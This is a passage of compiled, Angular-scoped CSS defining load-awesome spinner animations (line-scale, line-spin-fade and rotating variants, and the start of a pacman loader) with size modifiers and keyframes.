      animation-delay: -.23s
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-duration: .62s;
      animation-duration: .62s;
      -webkit-animation-delay: -.32s;
      animation-delay: -.32s
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-duration: .43s;
      animation-duration: .43s;
      -webkit-animation-delay: -.44s;
      animation-delay: -.44s
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-duration: .8s;
      animation-duration: .8s;
      -webkit-animation-delay: -.31s;
      animation-delay: -.31s
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-duration: .74s;
      animation-duration: .74s;
      -webkit-animation-delay: -.24s;
      animation-delay: -.24s
    }

    .la-line-scale-party.la-sm[_ngcontent-oeb-c134] {
      width: 20px;
      height: 16px
    }

    .la-line-scale-party.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 2px;
      height: 16px;
      margin: 0 1px
    }

    .la-line-scale-party.la-2x[_ngcontent-oeb-c134] {
      width: 80px;
      height: 64px
    }

    .la-line-scale-party.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 64px;
      margin: 0 4px
    }

    .la-line-scale-party.la-3x[_ngcontent-oeb-c134] {
      width: 120px;
      height: 96px
    }

    .la-line-scale-party.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 12px;
      height: 96px;
      margin: 0 6px
    }

    @-webkit-keyframes line-scale-party {
      0% {
        transform: scaleY(1)
      }

      50% {
        transform: scaleY(.3)
      }

      to {
        transform: scaleY(1)
      }
    }

    @keyframes line-scale-party {
      0% {
        transform: scaleY(1)
      }

      50% {
        transform: scaleY(.3)
      }

      to {
        transform: scaleY(1)
      }
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134],
    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-scale-pulse-out-rapid.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134] {
      width: 40px;
      height: 32px
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 32px;
      margin: 0 2px;
      border-radius: 0;
      -webkit-animation: line-scale-pulse-out-rapid .9s cubic-bezier(.11, .49, .38, .78) infinite;
      animation: line-scale-pulse-out-rapid .9s cubic-bezier(.11, .49, .38, .78) infinite
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -.9s;
      animation-delay: -.9s
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2),
    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -.65s;
      animation-delay: -.65s
    }

    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-line-scale-pulse-out-rapid[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -.4s;
      animation-delay: -.4s
    }

    .la-line-scale-pulse-out-rapid.la-sm[_ngcontent-oeb-c134] {
      width: 20px;
      height: 16px
    }

    .la-line-scale-pulse-out-rapid.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 2px;
      height: 16px;
      margin: 0 1px
    }

    .la-line-scale-pulse-out-rapid.la-2x[_ngcontent-oeb-c134] {
      width: 80px;
      height: 64px
    }

    .la-line-scale-pulse-out-rapid.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 64px;
      margin: 0 4px
    }

    .la-line-scale-pulse-out-rapid.la-3x[_ngcontent-oeb-c134] {
      width: 120px;
      height: 96px
    }

    .la-line-scale-pulse-out-rapid.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 12px;
      height: 96px;
      margin: 0 6px
    }

    @-webkit-keyframes line-scale-pulse-out-rapid {
      0% {
        transform: scaley(1)
      }

      80% {
        transform: scaley(.3)
      }

      90% {
        transform: scaley(1)
      }
    }

    @keyframes line-scale-pulse-out-rapid {
      0% {
        transform: scaley(1)
      }

      80% {
        transform: scaley(.3)
      }

      90% {
        transform: scaley(1)
      }
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134],
    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-scale-pulse-out.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134] {
      width: 40px;
      height: 32px
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 32px;
      margin: 0 2px;
      border-radius: 0;
      -webkit-animation: line-scale-pulse-out .9s cubic-bezier(.85, .25, .37, .85) infinite;
      animation: line-scale-pulse-out .9s cubic-bezier(.85, .25, .37, .85) infinite
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -.9s;
      animation-delay: -.9s
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2),
    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -.7s;
      animation-delay: -.7s
    }

    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-line-scale-pulse-out[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-line-scale-pulse-out.la-sm[_ngcontent-oeb-c134] {
      width: 20px;
      height: 16px
    }

    .la-line-scale-pulse-out.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 2px;
      height: 16px;
      margin: 0 1px
    }

    .la-line-scale-pulse-out.la-2x[_ngcontent-oeb-c134] {
      width: 80px;
      height: 64px
    }

    .la-line-scale-pulse-out.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 64px;
      margin: 0 4px
    }

    .la-line-scale-pulse-out.la-3x[_ngcontent-oeb-c134] {
      width: 120px;
      height: 96px
    }

    .la-line-scale-pulse-out.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 12px;
      height: 96px;
      margin: 0 6px
    }

    @-webkit-keyframes line-scale-pulse-out {
      0% {
        transform: scaley(1)
      }

      50% {
        transform: scaley(.3)
      }

      to {
        transform: scaley(1)
      }
    }

    @keyframes line-scale-pulse-out {
      0% {
        transform: scaley(1)
      }

      50% {
        transform: scaley(.3)
      }

      to {
        transform: scaley(1)
      }
    }

    .la-line-scale[_ngcontent-oeb-c134],
    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-scale[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-scale.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-scale[_ngcontent-oeb-c134] {
      width: 40px;
      height: 32px
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 32px;
      margin: 0 2px;
      border-radius: 0;
      -webkit-animation: line-scale 1.2s ease infinite;
      animation: line-scale 1.2s ease infinite
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: -1.2s;
      animation-delay: -1.2s
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -1.1s;
      animation-delay: -1.1s
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -1s;
      animation-delay: -1s
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      -webkit-animation-delay: -.9s;
      animation-delay: -.9s
    }

    .la-line-scale[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      -webkit-animation-delay: -.8s;
      animation-delay: -.8s
    }

    .la-line-scale.la-sm[_ngcontent-oeb-c134] {
      width: 20px;
      height: 16px
    }

    .la-line-scale.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 2px;
      height: 16px;
      margin: 0 1px
    }

    .la-line-scale.la-2x[_ngcontent-oeb-c134] {
      width: 80px;
      height: 64px
    }

    .la-line-scale.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 8px;
      height: 64px;
      margin: 0 4px
    }

    .la-line-scale.la-3x[_ngcontent-oeb-c134] {
      width: 120px;
      height: 96px
    }

    .la-line-scale.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 12px;
      height: 96px;
      margin: 0 6px
    }

    @-webkit-keyframes line-scale {

      0%,
      40%,
      to {
        transform: scaleY(.4)
      }

      20% {
        transform: scaleY(1)
      }
    }

    @keyframes line-scale {

      0%,
      40%,
      to {
        transform: scaleY(.4)
      }

      20% {
        transform: scaleY(1)
      }
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134],
    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-spin-clockwise-fade-rotating.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      -webkit-animation: line-spin-clockwise-fade-rotating-rotate 6s linear infinite;
      animation: line-spin-clockwise-fade-rotating-rotate 6s linear infinite
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      width: 2px;
      height: 10px;
      margin: -5px 2px 2px -1px;
      border-radius: 0;
      -webkit-animation: line-spin-clockwise-fade-rotating 1s ease-in-out infinite;
      animation: line-spin-clockwise-fade-rotating 1s ease-in-out infinite
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 15%;
      left: 50%;
      transform: rotate(0deg);
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 25.2512626585%;
      left: 74.7487373415%;
      transform: rotate(45deg);
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 85%;
      transform: rotate(90deg);
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 74.7487373415%;
      left: 74.7487373415%;
      transform: rotate(135deg);
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 84.9999999974%;
      left: 50.0000000004%;
      transform: rotate(180deg);
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 74.7487369862%;
      left: 25.2512627193%;
      transform: rotate(225deg);
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999806189%;
      left: 15.0000039834%;
      transform: rotate(270deg);
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-line-spin-clockwise-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 25.2506949798%;
      left: 25.2513989292%;
      transform: rotate(315deg);
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-line-spin-clockwise-fade-rotating.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-line-spin-clockwise-fade-rotating.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 1px;
      height: 4px;
      margin-top: -2px;
      margin-left: 0
    }

    .la-line-spin-clockwise-fade-rotating.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-line-spin-clockwise-fade-rotating.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 20px;
      margin-top: -10px;
      margin-left: -2px
    }

    .la-line-spin-clockwise-fade-rotating.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-line-spin-clockwise-fade-rotating.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 30px;
      margin-top: -15px;
      margin-left: -3px
    }

    @-webkit-keyframes line-spin-clockwise-fade-rotating-rotate {
      to {
        transform: rotate(-1turn)
      }
    }

    @keyframes line-spin-clockwise-fade-rotating-rotate {
      to {
        transform: rotate(-1turn)
      }
    }

    @-webkit-keyframes line-spin-clockwise-fade-rotating {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    @keyframes line-spin-clockwise-fade-rotating {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134],
    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-spin-clockwise-fade.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      width: 2px;
      height: 10px;
      margin: -5px 2px 2px -1px;
      border-radius: 0;
      -webkit-animation: line-spin-clockwise-fade 1s ease-in-out infinite;
      animation: line-spin-clockwise-fade 1s ease-in-out infinite
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 15%;
      left: 50%;
      transform: rotate(0deg);
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 25.2512626585%;
      left: 74.7487373415%;
      transform: rotate(45deg);
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 85%;
      transform: rotate(90deg);
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 74.7487373415%;
      left: 74.7487373415%;
      transform: rotate(135deg);
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 84.9999999974%;
      left: 50.0000000004%;
      transform: rotate(180deg);
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 74.7487369862%;
      left: 25.2512627193%;
      transform: rotate(225deg);
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999806189%;
      left: 15.0000039834%;
      transform: rotate(270deg);
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-line-spin-clockwise-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 25.2506949798%;
      left: 25.2513989292%;
      transform: rotate(315deg);
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-line-spin-clockwise-fade.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-line-spin-clockwise-fade.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 1px;
      height: 4px;
      margin-top: -2px;
      margin-left: 0
    }

    .la-line-spin-clockwise-fade.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-line-spin-clockwise-fade.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 20px;
      margin-top: -10px;
      margin-left: -2px
    }

    .la-line-spin-clockwise-fade.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-line-spin-clockwise-fade.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 30px;
      margin-top: -15px;
      margin-left: -3px
    }

    @-webkit-keyframes line-spin-clockwise-fade {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    @keyframes line-spin-clockwise-fade {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134],
    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-spin-fade-rotating.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px;
      -webkit-animation: ball-spin-fade-rotating-rotate 6s linear infinite;
      animation: ball-spin-fade-rotating-rotate 6s linear infinite
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      width: 2px;
      height: 10px;
      margin: -5px 2px 2px -1px;
      border-radius: 0;
      -webkit-animation: line-spin-fade-rotating 1s ease-in-out infinite;
      animation: line-spin-fade-rotating 1s ease-in-out infinite
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 15%;
      left: 50%;
      transform: rotate(0deg);
      -webkit-animation-delay: -1.125s;
      animation-delay: -1.125s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 25.2512626585%;
      left: 74.7487373415%;
      transform: rotate(45deg);
      -webkit-animation-delay: -1.25s;
      animation-delay: -1.25s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 85%;
      transform: rotate(90deg);
      -webkit-animation-delay: -1.375s;
      animation-delay: -1.375s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 74.7487373415%;
      left: 74.7487373415%;
      transform: rotate(135deg);
      -webkit-animation-delay: -1.5s;
      animation-delay: -1.5s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 84.9999999974%;
      left: 50.0000000004%;
      transform: rotate(180deg);
      -webkit-animation-delay: -1.625s;
      animation-delay: -1.625s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 74.7487369862%;
      left: 25.2512627193%;
      transform: rotate(225deg);
      -webkit-animation-delay: -1.75s;
      animation-delay: -1.75s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999806189%;
      left: 15.0000039834%;
      transform: rotate(270deg);
      -webkit-animation-delay: -1.875s;
      animation-delay: -1.875s
    }

    .la-line-spin-fade-rotating[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 25.2506949798%;
      left: 25.2513989292%;
      transform: rotate(315deg);
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-line-spin-fade-rotating.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-line-spin-fade-rotating.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 1px;
      height: 4px;
      margin-top: -2px;
      margin-left: 0
    }

    .la-line-spin-fade-rotating.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-line-spin-fade-rotating.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 20px;
      margin-top: -10px;
      margin-left: -2px
    }

    .la-line-spin-fade-rotating.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-line-spin-fade-rotating.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 30px;
      margin-top: -15px;
      margin-left: -3px
    }

    @-webkit-keyframes ball-spin-fade-rotating-rotate {
      to {
        transform: rotate(1turn)
      }
    }

    @keyframes ball-spin-fade-rotating-rotate {
      to {
        transform: rotate(1turn)
      }
    }

    @-webkit-keyframes line-spin-fade-rotating {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    @keyframes line-spin-fade-rotating {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    .la-line-spin-fade[_ngcontent-oeb-c134],
    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-spin-fade[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-spin-fade.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-spin-fade[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      width: 2px;
      height: 10px;
      margin: -5px 2px 2px -1px;
      border-radius: 0;
      -webkit-animation: line-spin-fade 1s ease-in-out infinite;
      animation: line-spin-fade 1s ease-in-out infinite
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 15%;
      left: 50%;
      transform: rotate(0deg);
      -webkit-animation-delay: -1.125s;
      animation-delay: -1.125s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 25.2512626585%;
      left: 74.7487373415%;
      transform: rotate(45deg);
      -webkit-animation-delay: -1.25s;
      animation-delay: -1.25s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 85%;
      transform: rotate(90deg);
      -webkit-animation-delay: -1.375s;
      animation-delay: -1.375s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 74.7487373415%;
      left: 74.7487373415%;
      transform: rotate(135deg);
      -webkit-animation-delay: -1.5s;
      animation-delay: -1.5s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 84.9999999974%;
      left: 50.0000000004%;
      transform: rotate(180deg);
      -webkit-animation-delay: -1.625s;
      animation-delay: -1.625s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 74.7487369862%;
      left: 25.2512627193%;
      transform: rotate(225deg);
      -webkit-animation-delay: -1.75s;
      animation-delay: -1.75s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999806189%;
      left: 15.0000039834%;
      transform: rotate(270deg);
      -webkit-animation-delay: -1.875s;
      animation-delay: -1.875s
    }

    .la-line-spin-fade[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 25.2506949798%;
      left: 25.2513989292%;
      transform: rotate(315deg);
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-line-spin-fade.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-line-spin-fade.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 1px;
      height: 4px;
      margin-top: -2px;
      margin-left: 0
    }

    .la-line-spin-fade.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-line-spin-fade.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 20px;
      margin-top: -10px;
      margin-left: -2px
    }

    .la-line-spin-fade.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-line-spin-fade.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 30px;
      margin-top: -15px;
      margin-left: -3px
    }

    @-webkit-keyframes line-spin-fade {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    @keyframes line-spin-fade {
      50% {
        opacity: .2
      }

      to {
        opacity: 1
      }
    }

    .la-pacman[_ngcontent-oeb-c134],
    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-pacman[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-pacman.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-pacman[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child,
    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      width: 0;
      height: 0;
      background: transparent;
      border-style: solid;
      border-right: solid transparent;
      border-width: 16px;
      border-radius: 100%;
      -webkit-animation: pacman-rotate-half-up .5s 0s infinite;
      animation: pacman-rotate-half-up .5s 0s infinite;
      position: absolute
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-name: pacman-rotate-half-down;
      animation-name: pacman-rotate-half-down;
      top: 0
    }

    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3),
    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4),
    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5),
    .la-pacman[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      position: absolute;
      top: 50%;
      left: 200%;
      width: 8px;
      height: 8px;
      border-radius: 100%;
      opacity: 0;
      -webkit-animation: pacman-balls 2s linear 0s infinite;
      animation: pacman-balls 2s linear 0s infinite
    }

